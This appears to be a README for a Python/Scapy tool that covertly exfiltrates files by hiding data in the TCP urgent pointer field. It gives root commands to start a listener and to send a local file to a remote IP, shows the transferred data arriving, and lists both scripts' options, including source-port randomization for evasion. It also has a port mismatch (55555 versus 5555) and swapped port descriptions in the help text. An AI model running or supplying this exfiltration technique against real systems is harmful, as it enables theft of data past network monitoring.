# Urgent Exfiltration

This sends data using the urgent pointer field in TCP packets.

Scapy needs root privileges for `send` and `sniff`.

Set up the listener:
```
# python3 urgent_exfil_server.py -p 55555 -f data.txt --truncate
```

Send the data:
```
# python3 urgent_exfil_client.py ../test -H '192.168.1.2' -p 5555
```

Hey neat, it came through:
```
# cat data.txt
This is the data to exfiltrate
```

## Parameters, flags, etc
```
# python3 urgent_exfil_client.py -h
usage: urgent_exfil_client.py [-h] -H HOST -p DEST_PORT
                              [--source-port SOURCE_PORT]
                              [--randomize-source-port] [-v] [--version]
                              FILE

Exfiltrate data using TCP urg pointer

positional arguments:
  FILE                  File to exfiltrate

optional arguments:
  -h, --help            show this help message and exit
  -H HOST, --host HOST  Destination host
  -p DEST_PORT, --destination-port DEST_PORT
                        Source port
  --source-port SOURCE_PORT
                        Destination port
  --randomize-source-port
                        Randomize source port for each packet
  -v, --verbose         Enable verbose output
  --version             Show version information
```

```
python3 urgent_exfil_server.py -h
WARNING: No route found for IPv6 destination :: (no default route?). This affects only IPv6
usage: urgent_exfil_server.py [-h] -p PORT -f OUTFILE [-v] [--truncate]
                              [--version]

Exfiltrate data using TCP urg pointer

optional arguments:
  -h, --help            show this help message and exit
  -p PORT, --port PORT  Port to watch for URG messages
  -f OUTFILE, --outfile OUTFILE
                        Location to save received data
  -v, --verbose         Enable verbose output
  --truncate            Truncate outfile
  --version             Show version information
```
